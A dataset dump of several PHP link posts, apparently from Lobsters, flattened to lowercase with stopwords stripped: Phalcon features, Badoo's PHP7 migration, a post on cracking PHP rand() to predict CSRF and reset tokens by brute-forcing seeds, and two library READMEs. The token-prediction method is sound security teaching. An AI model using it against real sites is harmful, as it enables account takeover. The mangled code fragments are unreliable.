phql select c car c order cname car manager executequery phql foreach car car echo name car name n transaction process performs multiple database operation might important step completed successfully data integrity maintained transaction offer ability ensure database operation executed successfully data committed database use phalconmvcmodeltransactionfailed use phalconmvcmodeltransactionmanager try create transaction manager manager new manager request transaction transaction manager get get robot deleted invoice invoice find invcstid foreach invoice invoice invoice settransaction transaction invoice delete false something wrong rollback transaction foreach invoice getmessages message transaction rollback message getmessage everything ok commit transaction transaction commit echo robot deleted successfully catch failed e echo failed reason e getmessage cache cache component allows faster access frequently used already processed data support many backends redis memcached mongo file apc use phalconcache use phalconcacheadapterfactory use phalconstorageserializerserializerfactory serializerfactory new serializerfactory adapterfactory new adapterfactory serializerfactory option defaultserializer json lifetime adapter adapterfactory newinstance apcu option cache new cache adapter template engine view represent user interface application template engine volt template engine inspired jinja built c php translate application many language easily form builder easily create html form flash message flash message used notify user state action template engine view represent user interface application view often html file embedded php code perform task related solely presentation data view handle job providing data web browser tool used make request application html body div classtop php partial sharedadbanner div div classcontent robot p check special robot p div div classfooter php partial sharedfooter div body html template engine volt volt ultrafast designer friendly templating language written zephirc php provides set helper write view easy way volt highly integrated component phalcon use standalone component application appviewsproductsshowvolt block lastproducts prod product name prodnamee prodstatus active price prodprice endif endfor endblock component phalcontranslate aid creating multilingual application application using component display content different language based user chosen language supported application appmessagesenphp message hi hello bye good bye hiname hello name song song song appmessagesesphp message hi hola bye adiós hiname hola name song esta canción e song use phalconmvccontroller use phalcontranslateadapternativearray usercontrollerphp class usercontroller extends controller protected function gettranslation browser best language language request getbestlanguage check lang translation file filename appmessages language php fileexists filename require filename else fallback default require appmessagesenphp return translation object return new nativearray array content message public function indexaction view name mike view gettranslation uservolt p php echo hi name p form builder element form rendered required developer internally phalcontag used produce correct html element pas additional html attribute second parameter render use phalconformsform use phalconformselementtext use phalconformselementselect form new form form add new text name form add new text telephone form add new select telephonetype array h home c cellphone flash message use flash notifier show notification user web application use phalconmvccontroller class postscontroller extends controller public function saveaction flash error error form flash success yes everything fine flash notice notice user flash warning warning acl access control list allows user access module authorized sharding connect store retrieve data many database system time crypt encryptdecrypt important data keep safe unauthorized thirdparties event extend framework component setting hook point create event make application flexible powerful acl built access control list acl use phalconacl use phalconaclenum use phalconaclrole use phalconacladaptermemory create acl acl new memory default action deny access acl setdefaultaction enum deny register two role user guest role array user new role user guest new role guest foreach role role acl addrole role sharding attach model different database use phalcondbadapterpdomysql use phalcondbadapterpdopostgresql service return mysql database container set dbmysql function return new mysql host localhost username root password secret dbname tutorial service return postgresql database container set dbpostgres function return new postgresql host localhost username postgres password dbname invo encryption phalcon provides encryption facility via phalconcrypt component class offer simple objectoriented wrapper openssl php encryption library use phalconcrypt crypt new crypt key secret key byte text text want encrypt encrypted crypt encrypt text key echo crypt decrypt encrypted key event management eventsmanager allows u attach listener particular type event type interest u dispatch following code filter event produced dispatcher use phalconmvcdispatcher use phalconeventsmanager container set dispatcher function create event manager manager new manager listen event produced dispatcher using securityplugin manager attach dispatch beforeexecuteroute new securityplugin handle exception notfound exception using notfoundplugin manager attach dispatch beforeexception new notfoundplugin dispatcher new dispatcher assign event manager dispatcher dispatcher seteventsmanager manager return dispatcher
193,Lobsters,php,PHP programming,How Badoo saved one million dollars switching to PHP7,https://techblog.badoo.com/blog/2016/03/14/how-badoo-saved-one-million-dollars-switching-to-php7/,badoo saved one million dollar switching,introduction benchmark lightspeed blog php devs benchmark experimenting hhvm deploying difficult slow inconvenient testing compatibility http githubcomfacebookhhvmblobmasterhphpdocinconsistencies http githubcomfacebookhhvmissues stateopen potential change engine extension zval zval char zendstring change array api change testing infrastructure article http open source go aop framework phpparser utility app code migration guide launch battle result cloud request time distrubition rusage cpu time memory usage cpu load mobile backend cluster hyperthreading badoo team,introduction hundred application server running fine account second project scale etsy switch process switching found couple bug bytecode cache system thankfully fixed excited share good news whole php community completely ready production stable significantly reduces memory consumption improves performance dramatically article discus process switching detail explaining difficulty encountered dealt final result first step back bit look broader issue idea database bottleneck webprojects alltoocommon misconception well designed system balanced input load increase part system take hit likewise certain threshold reached component hard disk database processor network part hit given reality processing power application cluster arguably important factor many project cluster made hundred even thousand server taking time adjust app cluster processing load justifies economic standpoint million dollar case php web apps processor consumes much dynamic highlevel language lot php developer faced particular obstacle one made victim vicious trolling various community absence jit least generator compilable text language like cc inability php community supply similar solution within frame core project fostered suboptimal tendency main player started slap together solution hhvm born facebook kphp vkontakte maybe similar hack thankfully php started release though still jit hard overestimate significant change even without jit hold hhvm eg benchmark lightspeed blog php devs benchmark new architecture even simplify addition jit future developer badoo paid careful attention every hack come recent year including hhvm pilot project decided wait arrival given promising launched badoo three million line php code test project took epic proportion keep reading find handled challenge came new php app testing framework way already open source saved million buck along way experimenting hhvm switching spent time looking way optimize backend first step course play around hhvm spent week experimenting got quite respectable result warming jit framework saw triple digit gain speed cpu use hand hhvm proved serious drawback deploying difficult slow deploy warm jitcache machine warming loaded production traffic everything go pretty slowly hhvm team also recommend warming parallel request way warmup phase big cluster operation go quickly additionally big cluster consisting hundred machine learn deploy batch thus architecture deploy procedure involved substantial difficult tell much time take ahead time u important deploy simple fast possible developer culture pride putting two planned release day able roll many hot fix inconvenient testing rely heavily runkit extension available hhvm bit later go detail runkit suffice say extension let change behavior variable class method function practically whatever want fly accomplished via integration get php hhvm engine bares faint resemblance however respective quite different due particular feature implementing runkit independently top hhvm insanely difficult rewrite ten thousand test order sure hhvm working correctly code seem worthwhile fair would later encounter problem option disposal still redo lot thing including getting rid runkit switch later compatibility main issue incomplete compatibility see http githubcomfacebookhhvmblobmasterhphpdocinconsistencies http githubcomfacebookhhvmissues stateopen incompatibility existing extension dozen incompatibility result obvious drawback project hhvm developed larger community rather within division facebook situation like easier company change internal rule standard without referencing community volume code contained therein word cut solve problem using resource therefore order handle task similar volume company need facebooklike resource devote initial implementation well continuing support proposition risky potentially expensive decided potential even though facebook huge company numerous topnotch programmer doubted hhvm developer would prove powerful entire phpcommunity reckoned soon something similar hhvm appeared php former would start slowly fade use patiently awaited switch new version interpreter important difficult process prepared putting together precise plan plan consisted three stage changing php builddeploy infrastructure adapting mass extension already written changing infrastructure testing environment changing php app code get detail stage later change engine extension badoo actively supported updated php branch started switching even official release regularly rebase upstream tree order update every release candidate patch customizations use everyday work also ported version work correctly automated process downloading building dependency extension php tree version simplified current work also bodes well future version come everything place mentioned also turn attention extension support extension half open source reworks order switch quickly possible decided launch two parallel process first involved individually rewriting critical extension blitz template engine data cache shared memoryapcu pinba statistic collector custom extension internal service total used force redo extension second involved actively ridding extension used noncritical part infrastructure order unclutter thing much possible easily able get rid extension insignificant figure additionally started actively discus compatibility maintain main open extension special thanks xdebug developer derick rethans go detail regarding technical detail porting extension bit later developer made lot change internal apis meant alter lot extension code important change zval zval earlier version zval structure always allocated new variable stack structure used char zendstring aggressive string caching php engine used version reason new engine complete switch regular string zendstring structure string stored along length change array api zendstring used key array implementation substitute double linked list ordinary array highlighted one block instead lot smaller one make possible radically reduce number small memory allocation result speed php engine double digit percentage point note change made necessary least alter extension rewrite completely though could rely author builtin extension make necessary change course responsible altering amount work substantial due change internal apis easier rewrite section code unfortunately introducing new structure using garbage collection along speeding code execution made engine complex became harder locate problem one problem concerned opcache cache flush cached bytecode break moment could used different process whole thing fall apart look outside zendstring function name constant suddenly break garbage appears place given use lot inhouse extension many deal particularly string suspected problem string used wrote lot test conducted plenty experiment get result expected finally asked help main php engine developer dmitri stogov one first question clear cache explained fact cleared cache every time point realized problem end opcache quickly reproduced case helped u replay fix problem within day without fix came version possible put stable production change testing infrastructure take special pride testing badoo deploy server php code production two time day every deploy contains task use feature branch git automated build tight jira integration given schedule task volume way could go without autotests currently around thousand unit test coverage run average minute cloud see article addition unit test use higherlevel autotests integration system test selenium test web page calabash test mobile apps taken whole allows u quickly reach conclusion quality concrete version code apply appropriate solution switching new version interpreter major change fraught potential problem especially important test worked order clarify exactly managed take look test development evolved year badoo often people starting think implementing product testing case started implementation already discover code ready experimentation process reason case important developer keep mind code testable writing architecture allow unit test replace call external dependency object order isolate code tested external condition course go without saying muchhated requirement many programmer take stand writing code principle feel restriction fly face often pay imagine sheer volume code written result testing delayed better experimenter trying satisfy running small test cover covered basically mean test yield expected result trying say company exception also implement testing right start project several line code worked fine production brought cash would stupid rewrite run test recommended literature would take long expensive fortunately already excellent tool allowed u solve majority problem runkit script running php extension let change delete add method class function used program also many function use tool developed supported many year sara goleman work facebook interestingly enough hhvm beginning continuing present maintained dmitri zenovich headed testing division begun mailru also done bit contribute project runkit dangerous extension let change constant function class script us running essence like tool rebuild plane flight runkit get right php fly one mistake deficiency make everything go flame either php fails spend lot time searching memory leak lowlevel debugging nonetheless tool essential testing implementing project testing without major rewrite done changing code fly runkit turned big problem switch support new version could sponsored development new version looking longterm perspective seem like reliable path pursue looked option one promising solution shift runkit uopz latter also php extension similar functionality launched colleague wamba suggested uopz focusing impressive speed maintainer uopz project way joe watkins first beat medium uk unfortunately however switching test uopz work place fatal error others segfaults created report movement unfortunately eg http trying deal situation rewriting test would expensive issue could well emerged even given rewrite lot code matter dependent external project like runkit uopz regardless problematic came obvious conclusion rewrite code independent possible also pledged everything could avoid similar problem future even ended switching hhvm similar product arrived framework system got name highlighting fact system work clean php without use extension project open source available form addon library softmocks tied particular php engine implementation work rewriting code analogously go aop framework test code primarily use following implementation override one class method function execution result override changing value global constant class constant adding method class thing implemented successfully using runkit rewriting code make possible reservation though space go much detail softmocks article plan devoting separate article topic future hit main point custom code connected rewrite wrapper function include operator automatically overridden wrapper check existing override added inside every custom method definition exist corresponding code executed direct function call replaced call wrapper let u catch builtin custom function call wrapper dynamically override access constant code softmocks work nikita phpparser library fast parsing time slower tokengetall interface let bypass parse tree includes convenient api handling syntactic construction indeterminate difficulty get back main point article switch switching project softmocks still test fix manually could say bad result given started test comparison runkit test run speed decrease performance issue softmocks fair note uopz supposed work significantly faster utility app code though contains many new development also issue backward compatibility first thing tackle problem read official migration guide quickly became clear without fixing existing code risking getting fatal error production encountering change code behavior show log would nonetheless cause app misbehave badoo several php code repository biggest contains million line code furthermore implemented many different thing php web business logic backend mobile apps testing utility code deploys situation complicated fact badoo project long history around ten year unfortunately legacy still present badoo use stare long method error detection socalled brazilian system whereby code deployed production wait see break carry high risk business logic break large percent user thus also unworkable option reason started looking way automate search place incompatibility initially tried use popular among developer unfortunately either support syntax feature yet function well enough find obviously dangerous place code conducting bit research ie googling decided try utility static code analyzer implemented php utility simple use work fairly quickly give result text file course panacea false positive failure find particularly wellhidden problem spot despite utility helped u root problem dramatically sped simplified process getting code ready commonly encountered potentially dangerous problem u following change behavior funcgetarg funcgetargs version php function return argument value moment transmission version seven happens moment funcgetargs called word argument variable change inside function funcgetargs called behavior code may differ version five thing happens business logic break nothing log indirect access object variable property method danger lie fact behavior change looking information difference version described detail use reserved class name longer use bool int float string null true false class name yeah null class absence actually make thing easier though often resulted error many potentially problematic foreach construction use reference found since tried earlier change iterable array inside foreach count internal pointer though practically behaved version remaining instance incompatibility either rarely encountered like modifier regular expression fixed simple replacement example constructor named construct using class name permitted even started fixing code worried developer making necessary compatibility change others would continue write code incompatible solve issue put prereceive hook every gitrepository executes l changed file word make sure syntax match guarantee compatibility issue clear host problem case developer attentive besides started run whole set test compare result additionally developer forbidden using new feature ie disable old prereceive hook l allowed u get code compatible version interpreter important addition problem php code potential issue extension personally attest evidenced unfortunately problem reproduced test environment saw heavy load production launch battle result clearly needed way simply quickly change php version quantity type server enable path cliinterpreter code replaced localphp turn symlink either way change php version server change link atomic operation important cliscripts stop launch nginx could two upstreams phpfpm launched different port like complicated nginx configuration executing everything listed switched running selenium test preproduction environment turned several problem noticed earlier problem concerned php code example could longer use outdated global variable httprawpostdata benefit filegetcontents well extension various type segmentation error fixing problem discovered earlier stage rewriting unit test also found bug interpreter like finally went call production launch new version php limited number server started one server every major cluster web backend mobile apps backend cloud increased quantity little little error occurred first large cluster completely switch cloud phpfpm requirement cluster fpm cluster wait u find dmitri stogov fix opcache problem taken care also switched fpm cluster result brief really quite impressive see rusage response time graph memory consumption processor use largest cluster consisting server mobile apps backend prague data center request time distrubition rusage cpu time memory usage cpu load mobile backend cluster place process time cut half improved overall response time since certain amount request processing time spent communicating database daemon logically expect part speed switching besides overall load cluster fell percent thanks hyperthreading technology contributing impressive result broad term load increase percent htengines useful physical engine start working already topic another article additionally memory use never bottleneck u reduced roughly eight time finally saved number machine word number server withstand much greater load lower expenditure associated acquiring servicing equipment result remaining cluster similar exception gain cloud bit modest around cpu due lack opcache much money save tally app server cluster badoo consists bit server cutting cpu usage half free around server consider initial price hardware factor depreciation work million dollar saving plus year hosting even take cloud consideration also saw performance boost thus pleased result also made switch like hear opinion happy answer question left commentary badoo team
195,Lobsters,php,PHP programming,Cracking PHP rand(),http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/,cracking php rand,rand work example program ezchatter seed cracking glibc rand window rand state cracking linux conclusion,webapps occasionally need create token hard guess example session token csrf token forgot password functionality get token mailed reset password token cryptographically secure often made calling rand multiple time transforming output string post explore hard predict token made rand rand work php function rand creates pseudorandom number initial state random number generator seed set srand call srand php seed random number generator hard guess number call rand seed passed srand totally determines string number rand generate random number generator keep state initially set srand changed every time call rand state specific process two process typically return different number rand window state size bit directly set using srand linux state bit example program example program ezchatter small toy program put together day use csrf token good job creating securily public static function gen len token len choose rand choose token chr rand ord ord z else choose token chr rand ord ord z else token chr rand ord ord return token see first call rand determine whether use uppercase letter lowercase letter number pick specific letter number every time request indexphp page get new csrf token request many want job predict token handed user csrf attack seed cracking said random number series totally defined seed simply try every possible number argument srand get random number generator right state note linux work server process fresh server process already seen lot rand call need amount cracking program get state window state random number generator argument srand need fresh process got token fresh process following php script used crack phpintmax srand token gen die found n search possible argument srand take approximately hour however since php call glibc rand function reimplement php code c speed thing made two version one call glibc rand one mimic window rand basically php code tokenphp copy paste extstandardrandc loop go every possible seed take minute window version couple hour linux version completed random number generator state keep generating token server comparing generated token token server return know token handed user start attack state cracking linux window cracking argument srand cracking state random number generator turn thing linux different glibc rand keep series number determines next state like state state state return state every output approximately summed output call ago consider following series token next rand determining whether uppercase letter lowercase letter number determined outcome rand call ago last expect next output rand approximately mod mean get number see predict number next call rand determines number determined rand call ago number rand call ago lowercase letter number thus mod mod thus expect number turn see accurately predict next token using method also clear predict much hardly call random may also possible crack whole state glibc random number generator given enough token although tried conclusion token created using cryptographically secure random number generator made rand state random number generator cracked trivially many case token predicted linux little bit harder predict token still give secure token random number generator window particularly easy exploit since state random number generator cracked within minute
196,Lobsters,php,PHP programming,Scrapbook: a PHP cache library,https://github.com/matthiasmullie/scrapbook/,scrapbook php cache library,donatesupport http wwwscrapbookcash http docsscrapbookcash table content installation usage composer keyvaluestore build cache adapter memcached pecl memcached extension redis pecl redis extension couchbase pecl couchbase extension apc u apc apcu mysql postgresql sqlite filesystem memory feature local buffer transaction stampede protection sharding interface keyvaluestore documentation psrcache psrsimplecache see documentation psrsimplecache psrcache see documentation collection compatibility travis ci flysystem license mit,donatesupport documentation http wwwscrapbookcash api reference http docsscrapbookcash table content installation usage simply add dependency matthiasmulliescrapbook composerjson file use composer manage dependency project composer require matthiasmulliescrapbook exact bootstrapping depend adapter feature interface want use detailed library built layer keyvaluestore implementation wrap inside one another want add feature simple example memcachedbacked psrcache stampede protection create memcached object pointing memcached server client new memcached client addserver localhost create scrapbook keyvaluestore object cache new matthiasmulliescrapbookadaptersmemcached client create stampede protector layer real cache cache new matthiasmulliescrapbookscalestampedeprotector cache create pool psrcache object cache engine pool new cache get item pool item pool getitem key get item value value item get change value store cache item set updatedvalue pool save item take look build cache section generate exact configuration like use adapter interface feature example code adapter memcached memcached inmemory keyvalue store small chunk arbitrary data string object result database call api call page rendering pecl memcached extension used interface memcached server provide valid memcached object memcached adapter create memcached object pointing memcached server client new memcached client addserver localhost create scrapbook keyvaluestore object cache new matthiasmulliescrapbookadaptersmemcached client redis redis often referred data structure server since key contain string hash list set sorted set bitmap hyperloglogs pecl redis extension used interface redis server provide valid redis object redis adapter create redis object pointing redis server client new redis client connect create scrapbook keyvaluestore object cache new matthiasmulliescrapbookadaptersredis client couchbase engineered meet elastic scalability consistent high performance alwayson availability data mobility requirement mission critical application pecl couchbase extension used interface couchbase server provide valid couchbasebucket object couchbase adapter create couchbasebucket object pointing couchbase server cluster new couchbasecluster couchbase localhost bucket cluster openbucket default create scrapbook keyvaluestore object cache new matthiasmulliescrapbookadapterscouchbase bucket apc u apc free open opcode cache php goal provide free open robust framework caching optimizing php intermediate code apc cache server data cached executing machine available php process machine pecl apc apcu extension used create scrapbook keyvaluestore object cache new matthiasmulliescrapbookadaptersapc mysql mysql world popular open source database mysql costeffectively help deliver high performance scalable database application database genuine cache also serve keyvalue store nt expect kind performance expect dedicated cache server could good reason use databasebased cache convenient already use database may benefit like persistent storage replication create pdo object pointing mysql server client new pdo mysql dbnamecache root create scrapbook keyvaluestore object cache new matthiasmulliescrapbookadaptersmysql client postgresql postgresql proven architecture earned strong reputation reliability data integrity correctness database genuine cache also serve keyvalue store nt expect kind performance expect dedicated cache server could good reason use databasebased cache convenient already use database may benefit like persistent storage replication create pdo object pointing postgresql server client new pdo pgsql userpostgres dbnamecache password create scrapbook keyvaluestore object cache new matthiasmulliescrapbookadapterspostgresql client sqlite sqlite software library implement selfcontained serverless zeroconfiguration transactional sql database engine database genuine cache also serve keyvalue store nt expect kind performance expect dedicated cache server create pdo object pointing sqlite server client new pdo sqlite cachedb create scrapbook keyvaluestore object cache new matthiasmulliescrapbookadapterssqlite client filesystem fastest kind cache term io access time opening file usually still beat redoing expensive computation filesystembased adapter us leagueflysystem abstract away file operation work kind storage leaguefilesystem provides create flysystem object adapter new leagueflysystemadapterlocal pathtocache lockex filesystem new leagueflysystemfilesystem adapter create scrapbook keyvaluestore object cache new matthiasmulliescrapbookadaptersflysystem filesystem memory php keep data memory php array storage particularly useful run test since nt install service stuffing value memory mostly useless drop end request unless using cached value request cache always empty little reason use cache however extremely useful unittesting run entire test suite memorybased store instead setting cache service making sure pristine state create scrapbook keyvaluestore object cache new matthiasmulliescrapbookadaptersmemorystore feature addition default cache functionality like get set scrapbook come neat little feature implemented little object implement keyvaluestore wrap around keyvaluestore word feature wrapped inside another one top adapter local buffer bufferedstore help reduce request real cache need request value various place code pain keep value around requesting cache would easier get latency connection cache server bufferedstore keep known value item already requested written memory every time need value request get memory instead going cache server wrap bufferedstore layer around adapter feature create buffered cache layer real cache cache new matthiasmulliescrapbookbufferedbufferedstore cache transaction transactionalstore make possible defer writes later point time similar transaction database deferred writes rolled back committed ensure data stored reliable complete stored nothing may want process code throughout codebase commit change everything successfully validated written permanent storage inside transaction nt worry data consistency inside transaction even yet committed always served one intend store word write new value cache yet committed still get value query rollback fail commit data stored another process caused commit fail get original value cache instead one intended commit wrap transactionalstore layer around adapter feature create transactional cache layer real cache cache new matthiasmulliescrapbookbufferedtransactionalstore cache tada use transaction begin transaction cache begin set value wo nt stored real cache commit called cache set key value return true get value wo nt get real cache yet set read php memory cache get key return value commit write operation effectively propagate update key real cache cache commit rollback discard uncommitted change cache rollback stampede protection cache stampede happens lot request data currently cache causing lot concurrent complex operation example cache expires something often heavy load sudden unexpected high load something likely cache case huge amount request data cache time cause expensive operation executed lot time stampedeprotector designed counteract value ca nt found cache placeholder stored indicate requested nt exist every followup request short period time find indication know another process already generating result wait becomes available instead crippling server wrap stampedeprotector layer around adapter feature create stampede protector layer real cache cache new matthiasmulliescrapbookscalestampedeprotector cache sharding much data request little server let shard multiple cache server data automatically distributed evenly across server pool individual cache server get fraction data traffic pas individual keyvaluestore object compose cache server pool constructor data sharded according order cache server passed constructor make sure always keep order sharding spread evenly cache server roughly receive amount cache key server bigger others offset adding cache server keyvaluestore object data even sharded among different adapter one server shard pool redis another memcached sure would want could wrap shard layer around adapter feature boilerplate code example redis matthiasmulliescrapbookkeyvaluestore adapter work client new redis client connect new matthiasmulliescrapbookadaptersredis client second redis server new redis connect new matthiasmulliescrapbookadaptersredis client create shard layer real cache cache automatically distribute data across server cache new matthiasmulliescrapbookscaleshard interface scrapbook support different interface scrapbookspecific keyvaluestore psr interface put forward php fig keyvaluestore keyvaluestore cornerstone project interface provides cache operation get getmulti set setmulti delete deletemulti add replace ca increment decrement touch flush ever used memcached keyvaluestore look similar since inspired bymodeled api adapter feature implement interface complex cache need like able ca one stick detailed list keyvaluestore interface method found documentation psrcache phpfig standard drastically different cache model keyvaluestore psrsimplecache instead directly querying value cache psrcache basically operates value object item perform change feed back cache pool nt let many operation get set delete multi counterpart delete need probably better using psrsimplecache see interface also supported cache library easily use psrcache wrapping around keyvaluestore object create pool object scrapbook keyvaluestore object pool new cache get item pool item pool getitem key get item value value item get change value store cache item set updatedvalue pool save item detailed list interface method found documentation psrsimplecache phpfig standard second phpfig cache standard driver model like keyvaluestore work much way nt let many operation get set delete multi counterpart delete need probably better using psrcache see interface also supported cache library easily use psrsimplecache wrapping around keyvaluestore object create simplecache object scrapbook keyvaluestore object simplecache new cache get value cache value simplecache get key store new value cache simplecache set key updatedvalue detailed list interface method found documentation collection collection namespaces wish isolated cache subset ever provide access value within context possible setfetch data across collection setting key different collection store different value retrieved respective collection flushing collection flush specific key leave key collection untouched flushing server however wipe everything including data collection server simple example let create memcached cache object client new memcached client addserver localhost cache new matthiasmulliescrapbookadaptersmemcached client articlecache cache collection article sessioncache cache collection session different key cache set key value one articlecache set key value two sessioncache set key value three clear entire article subset thus removing value two leaving everything else untouched articlecache flush remove everything server including subset value one value three also deleted cache flush getcollection available keyvaluestore implementation every adapter feature may wrap around also return keyvaluestore object part psr interface create collection first wrap collection inside psrcache psrsimplecache representation like articlecache cache collection article sessioncache cache collection session create pool object keyvaluestore collection articlepool new articlecache sessionpool new sessioncache compatibility possible scrapbook support php version current version well hhvm difference exact implementation cache backends across version platform mitigated within scrapbook ensure uniform behavior compatibility version platform tested travis ci using official php docker image mean php longer actively tested even though version supported scrapbook cache backends implementation particular version platform flysystem older php version obviously supported compatibility old software version broken easily unless compelling reason like security performance implication syntactic sugar reason break compatibility license scrapbook mit licensed
197,Lobsters,php,PHP programming,Humbug - a Mutation Testing framework for PHP,https://github.com/padraic/humbug,humbug mutation testing framework php,humbug mutation testing php infection git githubcom table content introduction lie damned lie code coverage towards mutation testing contributing contribution guide installation git phar http curlhaxxsecacacertpem composer usage configuration configure command manual configuration running humbug phpdbg metric command line option overriding configured timeout restricting file mutate mutate specific file incremental analysis performance mutators json log stats say rough edge bah humbug craig davis,humbug mutation testing php package deprecated check infection instead humbug mutation testing framework php currently development actually work quite well rough edge team minion working hard hammer fall gate warned update remote humbug transferred new location existing repository redirect transparently operation take time transition new url git remote seturl upstream http githubcomhumbughumbuggit replace upstream name remote use locally upstream commonly used may using something else may also using different url eg git githubcom mockerymockerygit run git remote v see actually using table content introduction mutation testing nutshell giving unit test run money involves injecting small defect source code checking unit test noticed unit test killed mutation mutation escaped detection unit test intended prevent regression real regression pas unnoticed would bad thing whereas code coverage tell code test executing mutation testing intended help judge well unit test actually perform could improved written detail mutation testing worth lie damned lie code coverage towards mutation testing contributing humbug open source project welcome pull request issue anyone opening pull request please read short contribution guide installation git clone install humbug dependency using composer git clone http githubcomhumbughumbuggit cd humbug pathtocomposerphar install humbug command binhumbug phar nt want track master branch directly install humbug phar follows wget http padraicgithubiohumbugdownloadshumbugphar wget http padraicgithubiohumbugdownloadshumbugpharpubkey wish make humbugphar directly executable chmod x humbugphar window download using browser powershell using following command wget alias invokewebrequest wget http padraicgithubiohumbugdownloadshumbugphar outfile humbugphar wget http padraicgithubiohumbugdownloadshumbugpharpubkey outfile humbugpharpubkey stuck powershell client newobject systemnetwebclient clientdownloadfile http padraicgithubiohumbugdownloadshumbugphar humbugphar clientdownloadfile http padraicgithubiohumbugdownloadshumbugpharpubkey humbugpharpubkey phar update phar signed openssl private key need pubkey file stored beside phar file time order use rename humbugphar humbug example also rename key humbugpharpubkey humbugpubkey phar release currently done manually updated frequency git master update current phar run humbugphar selfupdate note using phar mean fix may take longer reach version assurance stable development version public key downloaded reused selfupdate verify future phar release release commence towards stable alpha beta rc final release development track phar file selfupdate automatically reach stable release wish continue tracking development level phars need indicate using one stability flag humbugphar selfupdate dev selfupdate request debugging experience issue selfupdating unexpected openssl ssl error please ensure enabled openssl extension window adding uncommenting following line phpini file php command line different file http server extensionphpopenssldll certain ssl error may arise due missing certificate rectify finding location system eg c xamppphpextcacertpem alternatively downloading copy http curlhaxxsecacacertpem ensure following option correctly pointing file opensslcafilec pathtocacertpem composer due humbug dependency pegged recent version adding humbug composerjson may give rise conflict two method installation preferred occurs however install globally general purpose tool composer global require dev nt done previously add bashprofile bashrc export pathcomposervendorbin path humbug currently work php greater usage configuration humbug still development repeat beware rough edge configure command configure humbug project may run tool ask question required create humbug configuration file humbugjsondist manual configuration base directory project create humbugjsondist file timeout source directory src log text humbuglogtxt json humbuglogjson commit humbugjsondist vcs override locally humbugjson file edit appropriate define least one log detailed information escaped mutant available text log human readable source file exist base directory file source directory must excluded add exclude pattern one file base directory composer vendor test directory excluded timeout source directory excludes vendor test log text humbuglogtxt project base directory must run test another directory signal also need run humbug directory project base directory chdir test timeout source directory src running humbug ensure test passing state incomplete skipped test allowed humbug quit test failing magic command project base directory using phar download cloned humbug added humbug composer dependency project instead php xdebug extension may also run humbug via phpdbg went well get something similar humbug version humbug running test suite generate log code coverage data sec humbug completed initial test run successfully test line coverage humbug analysing source file mutation testing commencing file killed escaped uncovered e fatal error timed mm emmmmmssssmmmmmsmmmmmssseesssssssssssssssssm mmes sss mmmmemmessss ssmmssssm mmm ttm tmm ss smmsm mm esssem mmmmmm sssssmsmmmmmmm smmmms smmmsmmmmmm ms ssssssssm e s ms sss mmm mm sm ssssssssemsem msmmm mm mm eme sems sss sssssemssssm mmmmm sse mmmm mm ms ss ssssssssmmsss mssmssssssssssssssssss e sm mmmmmmmmmmsssssssmss mutation generated mutant killed mutant covered test covered mutant detected fatal error encountered time out encountered metric mutation score indicator msi mutation code coverage covered code msi remember mutant inevitably harmless ie false positive humbug result logged json logjson humbug result logged text logtxt explain perhaps cryptic progress output killed mutation mutation caused unit test fail positive outcome escaped mutation mutation unit test still passed want unit test detect behaviour change uncovered mutation mutation occurs line covered unit test since unit test another undesireable result fatal error e mutation created fatal error usually positive result since obviously going noticed case however might humbug problem need fixing timeout unit test exceed allowed timeout configured humbug likely positive result timeout appropriate often occurs mutation end creating infinite loop kill error timeouts counted detected mutation report error log chance humbug encountered internal error ie bug reported issue metric example summary result reported number metric score mutation score indicator msi mean generated mutation detected ie kill timeouts fatal error msi primary mutation testing metric given code coverage discrepancy code coverage terrible quality measurement example mutation code coverage average within ballpark normal code coverage code coverage ignores mutation frequency mutation score indicator code actually covered test ie ignoring code even tested give idea effective test exist really examine metric standout issue msi point lower reported code coverage unit test far le effective code coverage alone could detect interpreting result requires context log list undetected mutation diffs original source code examining provide insight specific mutation went undetected command line option humbug command line option note normally associated symfony console application overriding configured timeout manually set timeout threshold single test restricting file mutate interested mutating subset file pas number file option containing simple file name glob regular expression basically passed symfony finder name method humbug filenewclassphp file driverphp way restricts initial humbug check overall test suite still executed full ensure test passing correctly proceeding mutate specific file want mutate specific file pas number path option containing full path file name option passed filter closure intersect file found using config andor file option file provided using path option humbug pathsrcdatanewclassphp pathsrcdriverdriverphp note way restricts initial humbug check overall test suite still executed full ensure test passing correctly proceeding incremental analysis incremental analysis ia experimental unfinished mode operation result cached locally run reused make sense present mode operates naively eliminating test run immediate file mutated relevant test mutated line modified since last run determined comparing file involved ia mode offer significant performance increase relatively stable code base free test see fare real life future need take account change file contain parent class imported trait class immediate dependency impact behaviour given object ia utilises local permanent cache eg homepadraichumbug performance mutation testing traditionally slow concept rerun test suite mutation generated speed thing significantly humbug following test run us test class cover specific file line mutation inserted order test class run slowest go last hopefully faster test detect mutation early mutation fall line covered test well nt bother running test performance may depending source code significantly impacted timeouts default may far high smaller codebases far low larger one rule thumb nt exceed second needed normally run test mutated set lower speed humbug aware humbug run slower unit testing second test suite may require second mutation testing minute depends interplay line code number test level code coverage performance code test mutators humbug implement basic suite mutators essentially tell u particular php token mutated also apply mutation array token note source code held within function rather class method mutated time binary arithmetic original mutated original mutated boolean substitution temporarily encompasses logical mutators original mutated true false false true conditional boundary original mutated negated conditionals original mutated original mutated increment original mutated return value original mutated original mutated return true return false return return return false return true return return null return return return function function return null return return return new class new class return null return return return anything anything return null return return literal number original mutated int int float float float statement statement covered largely previous mutators special case using native function class method without compare operation eg isint inarray would cover function defined file since nt exist runtime something else work original mutated isint isint mutators added time json log stats binhumbug stats myprojecthumbuglogjson myprojectlistofclassestxt skipkilledyes vvv par stats humbuglogjson custom named json log cli reference humbug stats humbuglogjson location class list location skipkilledyes vvv humbuglogjson location default humbuglogjson class list location path text file containing full class name one per line filesrelated stats would shown skipkilledyes used completely skip output killed section various verbosity level define amount info displayed default one line per class amount mutant killedescapederroredtimed depending output section v add one line per mutant line number method name vv add extra line mutant displaying diff view line mutant detected vvv show full diff several line tested humbug running humbug dir binhumbug binhumbug stats vvv say rough edge short list known issue humbug initial test run logging code coverage allow user optionally test class test run specific order fastest first interdependent test class may therefore fail regularly skew result currently phpunit specific well adapter phpunit code shovelled certain test suite may make assumption sole access resource like tmp cause error humbug try using fine grained test ordering speed opposed large grained test class ordering awaiting implementation test class used carry nonphpunit dependent testing code eg registershutdownfunction may create issue combined one humbug optimisation assume finished test really finished bah humbug courtesy craig davis saw potential empty repository p uuu dhhhhhldhhhhb uhhhhhhhhhhhhhf uhhhhhhhhh uhhhhhhhhhhhhhp hhhhhhhhhhh dhhuhhhhhhhhp g g j hhhhhhhhhp u 